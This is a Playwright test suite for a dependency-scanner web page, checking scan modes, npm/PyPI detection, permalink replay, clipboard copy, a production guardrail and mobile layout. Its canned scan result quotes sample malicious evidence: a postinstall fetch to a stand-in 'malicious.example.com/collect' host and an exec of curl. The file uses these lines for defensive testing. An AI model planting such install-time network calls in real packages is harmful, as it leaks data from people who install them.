// @ts-check
// tests/scan-p3.spec.js
// -----------------------------------------------------------------------------
// P3 — Scanner Showstopper Playwright suite.
//
// Covers the seven acceptance cases from the packet's §6 spec:
//   1) Default scan mode is "profile" (single-artifact capability scan).
//   2) The Diff tab exposes the before + after dropzones.
//   3) Filename-driven ecosystem detection — npm.
//   4) Filename-driven ecosystem detection — PyPI.
//   5) /?scan=<id> permalink replay renders the canned result read-only.
//   6) #sr-copy copies the exact rendered result JSON to the clipboard.
//   7) Mobile viewport (375x812) collapses <details class="sr-group"> so only
//      the summary is visible; expanded finding rows are hidden until tap.
//
// The Cloudflare Worker is never contacted for real; every test either
// (a) never talks to the Worker, or (b) fulfills the canned response via
// page.route('**/scan/*', ...). A beforeEach installs a default abort so any
// accidental Worker traffic in a test that DIDN'T explicitly opt into the
// mock will fail loudly rather than time out against real DNS.
// -----------------------------------------------------------------------------

import { test, expect } from '@playwright/test';

// ─── Canned data ─────────────────────────────────────────────────────────────
// Two findings on one package so we can assert plural finding count + singular
// package count without ambiguity. Shape matches what results/<id>.json
// produces on GitHub after a real vetlock diff, so renderResult() consumes it
// with zero massaging — which is the truthfulness invariant P3 must preserve.
const CANNED_RESULT = {
  verdict: 'BLOCK',
  ecosystem: 'npm',
  durationMs: 1240,
  findings: [
    {
      severity: 'BLOCK',
      package: 'ua-parser-js',
      from: '0.7.28',
      to: '0.7.29',
      detector: 'postinstall-network',
      category: 'supply-chain',
      message: 'Postinstall script contacts a new network endpoint.',
      evidence: [
        { file: 'postinstall.js', line: 12, snippet: "fetch('https://malicious.example.com/collect')" },
      ],
      provenance: [['my-app', 'ua-parser-js']],
    },
    {
      severity: 'WARN',
      package: 'ua-parser-js',
      from: '0.7.28',
      to: '0.7.29',
      detector: 'new-child-process',
      category: 'supply-chain',
      message: 'New use of child_process.exec introduced by this update.',
      evidence: [
        { file: 'index.js', line: 42, snippet: "exec('curl https://example.com')" },
      ],
      provenance: [['my-app', 'ua-parser-js']],
    },
  ],
};

// A minimal but real package-lock.json v3 payload — passes validateLockfileText
// (`lockfileVersion` + `packages` present, JSON.parseable) so the drop handler
// doesn't reject it before the ecosystem-detection code runs.
const MIN_PACKAGE_LOCK = JSON.stringify(
  { name: 'x', version: '1.0.0', lockfileVersion: 3, packages: {} },
  null,
  2,
);

// A minimal requirements.txt — two pinned deps, no comments. The exact bytes
// don't matter for the ecosystem-chip test; what matters is the *filename*.
const MIN_REQUIREMENTS = 'requests==2.31.0\nurllib3==2.0.7\n';

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Fulfill a GET /scan/<id> request with the "ready" envelope the Worker's
 * handleStatus already emits ({ status: "ready", result }). Any other Worker
 * route on this page is aborted so we surface bugs where the client would
 * try to POST /scan or otherwise call out during a permalink page load.
 *
 * @param {import('@playwright/test').Page} page
 * @param {string} id
 * @param {object} [result]
 */
async function mockWorkerReady(page, id, result = CANNED_RESULT) {
  await page.route('**/scan/**', async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    if (req.method() === 'GET' && url.pathname.endsWith(`/scan/${id}`)) {
      await route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: JSON.stringify({ status: 'ready', result }),
      });
      return;
    }
    await route.abort('failed');
  });
}

/**
 * Drop a file onto a dropzone by driving its hidden <input type="file">. This
 * is how the scanner receives files today (dz click → input.click → change),
 * so setInputFiles exercises the same handleFile() path as a real drag-drop.
 *
 * @param {import('@playwright/test').Page} page
 * @param {string} dropzoneSelector  e.g. '#dz-single', '#dz-before'
 * @param {string} filename
 * @param {string} content
 */
async function setDropzoneFile(page, dropzoneSelector, filename, content) {
  const isJson = filename.endsWith('.json');
  await page.locator(`${dropzoneSelector} input[type="file"]`).setInputFiles({
    name: filename,
    mimeType: isJson ? 'application/json' : 'text/plain',
    buffer: Buffer.from(content, 'utf8'),
  });
}

// ─── Global guardrail ────────────────────────────────────────────────────────
// Block every Worker request by default. Tests that need a canned response
// call mockWorkerReady() inside the test body; Playwright's route registry
// is LIFO, so a per-test route registered later takes precedence over this.
test.beforeEach(async ({ page }) => {
  await page.route('**/scan/**', (route) => route.abort('failed'));
});

// ─── 1. Default mode is profile ──────────────────────────────────────────────
test('default mode is profile', async ({ page }) => {
  await page.goto('/');
  // The #scan section carries the current mode as a data attribute so CSS,
  // screen readers, and this test all read from one source of truth.
  await expect(page.locator('#scan')).toHaveAttribute('data-scan-mode', 'profile');
  // ARIA tab state matches: profile selected, diff not.
  await expect(page.locator('#tab-profile')).toHaveAttribute('aria-selected', 'true');
  await expect(page.locator('#tab-diff')).toHaveAttribute('aria-selected', 'false');
  // The profile tabpanel is shown; the diff panel stays hidden by default.
  await expect(page.locator('#panel-profile')).toBeVisible();
  await expect(page.locator('#panel-diff')).toBeHidden();
  // The single-artifact dropzone lives inside the profile panel.
  await expect(page.locator('#panel-profile #dz-single')).toBeVisible();
});

// ─── 2. Switching to diff exposes both dropzones ─────────────────────────────
test('switching to diff shows two dropzones', async ({ page }) => {
  await page.goto('/');
  await page.locator('#tab-diff').click();
  // The mode attribute flips; ARIA state flips; both panels swap visibility.
  await expect(page.locator('#scan')).toHaveAttribute('data-scan-mode', 'diff');
  await expect(page.locator('#tab-diff')).toHaveAttribute('aria-selected', 'true');
  await expect(page.locator('#tab-profile')).toHaveAttribute('aria-selected', 'false');
  await expect(page.locator('#panel-diff')).toBeVisible();
  await expect(page.locator('#panel-profile')).toBeHidden();
  // Both before + after dropzones are visible inside the diff panel.
  await expect(page.locator('#panel-diff #dz-before')).toBeVisible();
  await expect(page.locator('#panel-diff #dz-after')).toBeVisible();
});

// ─── 3. Ecosystem detection — npm ────────────────────────────────────────────
test('ecosystem detection npm', async ({ page }) => {
  await page.goto('/');
  // Default mode is profile → drop into the single-artifact dropzone.
  await setDropzoneFile(page, '#dz-single', 'package-lock.json', MIN_PACKAGE_LOCK);
  const chip = page.locator('#sr-ecosystem');
  await expect(chip).toBeVisible();
  await expect(chip).toHaveText(/npm/i);
  // The class variant carries the ecosystem so CSS + a11y can key off it.
  await expect(chip).toHaveClass(/npm/);
});

// ─── 4. Ecosystem detection — PyPI ───────────────────────────────────────────
test('ecosystem detection pypi', async ({ page }) => {
  await page.goto('/');
  await setDropzoneFile(page, '#dz-single', 'requirements.txt', MIN_REQUIREMENTS);
  const chip = page.locator('#sr-ecosystem');
  await expect(chip).toBeVisible();
  await expect(chip).toHaveText(/pypi/i);
  await expect(chip).toHaveClass(/pypi/);
});

// ─── 5. Permalink read-only replay ───────────────────────────────────────────
test('permalink read-only replay', async ({ page }) => {
  const id = 'canned-id-123';
  await mockWorkerReady(page, id);
  await page.goto(`/?scan=${id}`);
  // The result panel is rendered with the canned verdict + counts pulled
  // from the mocked handleStatus response — bit-for-bit truthful.
  await expect(page.locator('#scan-result')).toBeVisible();
  await expect(page.locator('#sr-verdict')).toHaveText('BLOCK');
  // Two findings, one package (both entries in CANNED_RESULT are ua-parser-js).
  await expect(page.locator('#sr-meta')).toContainText(/2 findings?/);
  await expect(page.locator('#sr-meta')).toContainText(/1 package(?!s)/);
  // Read-only mode hides the mode picker and both tabpanels — the user can't
  // start a new scan without leaving the permalink first.
  await expect(page.locator('.scan-mode')).toBeHidden();
  await expect(page.locator('#panel-profile')).toBeHidden();
  await expect(page.locator('#panel-diff')).toBeHidden();
  // The banner is shown with a "Try your own scan" affordance so the user
  // knows this is a replay and how to escape to interactive mode.
  const banner = page.locator('#scan-readonly-banner');
  await expect(banner).toBeVisible();
  await expect(banner).toContainText(/try your own/i);
});

// ─── 6. Copy-JSON button ─────────────────────────────────────────────────────
test('copy-JSON button', async ({ browser }) => {
  // Fresh context so we can grant clipboard permissions; the shared page
  // fixture inherits its context's permissions before any beforeEach fires.
  const ctx = await browser.newContext({
    permissions: ['clipboard-read', 'clipboard-write'],
  });
  const page = await ctx.newPage();
  const id = 'canned-id-123';
  await mockWorkerReady(page, id);
  await page.goto(`/?scan=${id}`);
  const copy = page.locator('#sr-copy');
  await expect(copy).toBeVisible();
  await copy.click();
  // Read the clipboard back. Pretty-printed JSON parses to the exact object
  // renderResult() received — no massaging, no drift between what the panel
  // shows and what the user shares to a bug report.
  const copied = await page.evaluate(() => navigator.clipboard.readText());
  expect(JSON.parse(copied)).toEqual(CANNED_RESULT);
  await ctx.close();
});

// ─── 8. Corpus-only guardrail on production origin ───────────────────────────
// Every other test in this file navigates to http://127.0.0.1:4173, so
// `isLiveEnabled()` (app.js) returns true and the UI runs in the fully-unlocked
// live branch. Packet §6.6 requires the OPPOSITE on the production deploy:
// no free-form dropzones, no dispatch of arbitrary user lockfiles — only the
// bundled corpus fixtures are runnable. Without this test the guardrail is
// code-only, not test-verified: a future refactor could hide it silently.
//
// We serve the site as if from `https://oj-uday.github.io/` by routing every
// request Playwright issues against that origin to the local files on disk.
// This shifts `location.hostname` to `oj-uday.github.io` — the guardrail's
// only trigger — without needing to run behind an actual DNS-mapped domain,
// and without monkey-patching `location.hostname` (which modern Chromium
// forbids: `Object.defineProperty(location, 'hostname', …)` throws
// "Cannot redefine property: hostname").
test('corpus-only guardrail on production origin', async ({ browser }) => {
  // Fresh context so this test's route rewrite doesn't leak to any other.
  const ctx = await browser.newContext();
  const page = await ctx.newPage();

  // Node-side FS module + repo root: `import` at module scope would run for
  // every test file even when the guardrail test isn't selected, so we
  // dynamic-import them here to keep the top of the file dependency-free.
  // Playwright transpiles this .js test file, which breaks `import.meta.url`
  // — use process.cwd() instead. `playwright.config.js` runs the suite from
  // the repo root so cwd IS the repo root.
  const { readFileSync } = await import('node:fs');
  const { join, extname } = await import('node:path');
  const ROOT = process.cwd();

  // Minimal mime map — enough for the page shell + its four site assets.
  const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js':   'application/javascript; charset=utf-8',
    '.css':  'text/css; charset=utf-8',
    '.svg':  'image/svg+xml',
    '.json': 'application/json',
    '.pdf':  'application/pdf',
    '.txt':  'text/plain; charset=utf-8',
  };

  // Route ONLY oj-uday.github.io requests to the repo working tree. Any other
  // origin (fonts CDN, Cloudflare Worker) falls through to route.continue()
  // and lands in the file-scope beforeEach abort — no real network hits.
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.hostname !== 'oj-uday.github.io') {
      await route.continue();
      return;
    }
    let path = url.pathname;
    if (path === '/' || path.endsWith('/')) path += 'index.html';
    try {
      const body = readFileSync(join(ROOT, path));
      await route.fulfill({
        status: 200,
        contentType: MIME[extname(path)] || 'application/octet-stream',
        body,
      });
    } catch {
      await route.fulfill({ status: 404, contentType: 'text/plain', body: 'not found' });
    }
  });

  await page.goto('https://oj-uday.github.io/', { waitUntil: 'domcontentloaded' });

  // Sanity: applyLiveGate() ran because location.hostname !== 127.0.0.1 /
  // localhost / ::1. The gate stamps a data-attribute the CSS + this test
  // can both key off of — one source of truth for "we are in gated mode".
  await expect(page.locator('#scan')).toHaveAttribute('data-live-gated', 'true');

  // Guardrail #1 — the mode picker + both dropzone panels are hidden. The
  // user cannot see, click into, or drop onto the profile or diff dropzones.
  await expect(page.locator('#scan-mode')).toBeHidden();
  await expect(page.locator('#panel-profile')).toBeHidden();
  await expect(page.locator('#panel-diff')).toBeHidden();

  // Guardrail #2 — Run is disabled by default and cannot be enabled by
  // populating state.files.* via loadExample('benign'). loadExample sets
  // state.files.before/after (a benign debug@4.3.4→4.3.5 pair) but leaves
  // state.corpusId null, so updateRunEnabled()'s blockedByCorpusOnly branch
  // keeps the button disabled. Fixture-button dispatch is the ONLY path.
  await expect(page.locator('#scan-run')).toBeDisabled();
  await page.locator('#scan-example-benign').click();
  await expect(page.locator('#scan-run')).toBeDisabled();

  // Guardrail #3 (positive path) — Try malicious calls loadCorpusExample(),
  // which DOES set state.corpusId. The Run button then enables because a
  // corpus dispatch is the sanctioned bundled-fixture demo — the ONE payload
  // shape that never ships user lockfile bytes to the Worker.
  //
  // A full page reload resets state cleanly (state.files.before/after from
  // the previous loadExample() were populated; hardResetScanner clears
  // them). Without this reload the "hasPair" branch of updateRunEnabled
  // would also be true, muddying which condition actually flipped Run.
  await page.goto('https://oj-uday.github.io/', { waitUntil: 'domcontentloaded' });
  await expect(page.locator('#scan-run')).toBeDisabled();
  await page.locator('#scan-example').click();
  await expect(page.locator('#scan-run')).toBeEnabled();

  await ctx.close();
});

// ─── 7. Mobile scanner collapse ──────────────────────────────────────────────
test('mobile scanner collapse still works', async ({ browser }) => {
  // 375x812 = iPhone-class portrait, matches spec §B.2 ≤480px breakpoint.
  const ctx = await browser.newContext({ viewport: { width: 375, height: 812 } });
  const page = await ctx.newPage();
  const id = 'canned-id-123';
  await mockWorkerReady(page, id);
  await page.goto(`/?scan=${id}`);

  // On mobile the OUTER <details.sr-details> wraps every severity group and
  // starts CLOSED — the tap-to-expand chip is the only visible child. This is
  // the P1 collapse; the P3 per-severity <details.sr-group> is an interior
  // enhancement that only matters once the outer is expanded.
  const outer = page.locator('.sr-details').first();
  await expect(outer).toBeAttached();
  const outerOpen = await outer.evaluate((el) => /** @type {HTMLDetailsElement} */ (el).open);
  expect(outerOpen).toBe(false);
  const outerSummary = outer.locator('> summary').first();
  await expect(outerSummary).toBeVisible();
  await expect(outerSummary).toContainText(/tap to expand/i);

  // Expand the outer chip, then verify the P3 inner per-severity <details> is
  // itself collapsed by default so a long report stays scannable on mobile.
  await outerSummary.click();
  const group = page.locator('.sr-group').first();
  await expect(group).toBeVisible();
  const isOpen = await group.evaluate((el) => /** @type {HTMLDetailsElement} */ (el).open);
  expect(isOpen).toBe(false);
  await expect(group.locator('summary')).toBeVisible();
  await expect(group.locator('.sr-pkg').first()).toBeHidden();

  await ctx.close();
});
